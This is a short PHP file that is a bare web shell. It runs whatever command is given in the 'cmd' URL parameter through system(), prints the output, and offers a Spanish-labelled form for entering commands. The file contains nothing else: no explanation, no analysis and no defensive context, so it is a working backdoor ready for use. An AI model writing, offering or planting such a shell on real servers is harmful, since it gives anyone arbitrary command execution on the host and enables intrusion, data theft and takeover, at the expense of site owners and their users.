<?php
    if(isset($_GET['cmd'])){
       echo "<pre>";
       system($_GET['cmd']);
       echo "</pre>";
   }

 ?>
  <form method="get">
       Comando: <input type="text" name="cmd">
       <input type = "submit" value="Ejecutar">
  </form>